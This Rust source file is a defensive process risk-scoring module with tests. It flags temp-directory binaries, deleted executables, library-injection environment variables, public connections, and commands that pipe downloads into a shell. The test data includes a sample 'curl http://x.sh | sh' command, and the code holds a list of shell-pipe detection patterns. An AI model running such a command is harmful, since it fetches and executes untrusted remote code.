//! Risk scoring: aggregate the "something is off about this process"
//! signals into one 0–10 score. Deliberately heuristic — every signal is
//! also reported verbatim so the score never hides its reasoning.

use serde::Serialize;

use crate::model::{Process, Socket};

pub const MAX_SCORE: u8 = 10;

#[derive(Debug, Clone, Serialize)]
pub struct Risk {
    /// 0–10; each contributing signal has a weight (3/4 for strong
    /// indicators, 1–2 for context).
    pub score: u8,
    pub signals: Vec<String>,
}

pub fn assess(p: &Process, sockets: &[Socket]) -> Risk {
    let mut score: u32 = 0;
    let mut signals: Vec<String> = Vec::new();
    let add = |weight: u32, msg: String, score: &mut u32, signals: &mut Vec<String>| {
        *score += weight;
        signals.push(msg);
    };

    if let Some(exe) = &p.exe {
        if is_temp_path(exe) {
            add(
                3,
                format!("binary runs from a temp directory ({})", temp_component(exe)),
                &mut score,
                &mut signals,
            );
        }
    }
    if p.exe_deleted {
        add(
            3,
            "binary deleted from disk while still running".into(),
            &mut score,
            &mut signals,
        );
    }
    if pipes_into_shell(&p.command_line()) {
        add(
            4,
            "command pipes a download straight into a shell".into(),
            &mut score,
            &mut signals,
        );
    }
    if let Some(env) = &p.env {
        for (k, v) in env {
            let ku = k.to_ascii_uppercase();
            if (ku == "LD_PRELOAD" || ku == "DYLD_INSERT_LIBRARIES") && !v.is_empty() {
                add(3, format!("{} injection (={})", k, v), &mut score, &mut signals);
            }
        }
    }
    let external = sockets.iter().any(|s| {
        s.pid == Some(p.pid)
            && s.state.eq_ignore_ascii_case("ESTABLISHED")
            && s.peer_addr.as_deref().map(is_public_addr).unwrap_or(false)
    });
    if external {
        add(
            2,
            "established connection to a public address".into(),
            &mut score,
            &mut signals,
        );
    }

    Risk {
        score: score.min(MAX_SCORE as u32) as u8,
        signals,
    }
}

fn is_temp_path(path: &str) -> bool {
    let p = path.to_ascii_lowercase();
    // macOS resolves /tmp → /private/tmp
    p.starts_with("/tmp/")
        || p.starts_with("/private/tmp/")
        || p.starts_with("/var/tmp/")
        || p.starts_with("/private/var/tmp/")
        || p.starts_with("/dev/shm/")
        || p.starts_with("\\temp\\")
        || p.contains("\\appdata\\local\\temp\\")
}

fn temp_component(path: &str) -> String {
    let p = path.replace('\\', "/");
    for marker in ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/", "/dev/shm/"] {
        if let Some(i) = p.find(marker) {
            return p[i + marker.len()..].split('/').next().unwrap_or("").to_string();
        }
    }
    String::new()
}

fn pipes_into_shell(cmd: &str) -> bool {
    let c = cmd.to_ascii_lowercase();
    ["| sh", "|sh", "| bash", "|bash", "| sudo sh", "| sudo bash", "| zsh", "|zsh"]
        .iter()
        .any(|pat| c.contains(pat))
}

/// Heuristic public-address check: RFC1918/loopback/link-local/ULA are not
/// public; everything else numeric is.
pub fn is_public_addr(addr: &str) -> bool {
    let a = addr.trim_start_matches('*');
    if a.is_empty() || a == "0.0.0.0" || a == "::" {
        return false;
    }
    if a.contains(':') {
        // IPv6
        let l = a.to_ascii_lowercase();
        return !(l.starts_with("::1")
            || l.starts_with("fe80")
            || l.starts_with("fc")
            || l.starts_with("fd")
            || l == "::");
    }
    let octets: Vec<u32> = a.split('.').filter_map(|x| x.parse().ok()).collect();
    if octets.len() != 4 {
        return false;
    }
    let (o0, o1, _) = (octets[0], octets[1], octets[2]);
    !(o0 == 10
        || o0 == 127
        || (o0 == 192 && o1 == 168)
        || (o0 == 172 && (16..=31).contains(&o1))
        || (o0 == 169 && o1 == 254))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn proc_with(exe: Option<&str>, cmd: &str, deleted: bool) -> Process {
        Process {
            name: "x".into(),
            exe: exe.map(|e| e.into()),
            exe_deleted: deleted,
            cmdline: vec![cmd.into()],
            ..Default::default()
        }
    }

    #[test]
    fn temp_and_deleted_score() {
        let r = assess(&proc_with(Some("/tmp/evil", ), "/tmp/evil", true), &[]);
        assert_eq!(r.score, 6);
        assert_eq!(r.signals.len(), 2);
        assert!(r.signals.iter().any(|s| s.contains("temp")));
    }

    #[test]
    fn curl_pipe_shell_detected() {
        let r = assess(&proc_with(None, "curl http://x.sh | sh", false), &[]);
        assert!(r.signals.iter().any(|s| s.contains("pipes")));
        assert_eq!(r.score, 4);
        // ordinary pipelines don't trigger
        let ok = assess(&proc_with(None, "cat a | grep b", false), &[]);
        assert_eq!(ok.score, 0);
    }

    #[test]
    fn public_addr_classification() {
        assert!(is_public_addr("93.184.216.34"));
        assert!(!is_public_addr("10.0.0.7"));
        assert!(!is_public_addr("192.168.1.2"));
        assert!(!is_public_addr("172.16.0.1"));
        assert!(is_public_addr("172.32.0.1"));
        assert!(!is_public_addr("127.0.0.1"));
        assert!(!is_public_addr("::1"));
        assert!(!is_public_addr("fe80::1"));
        assert!(!is_public_addr("fd00::1"));
        assert!(is_public_addr("2606:4700::1"));
        assert!(!is_public_addr("*"));
    }
}
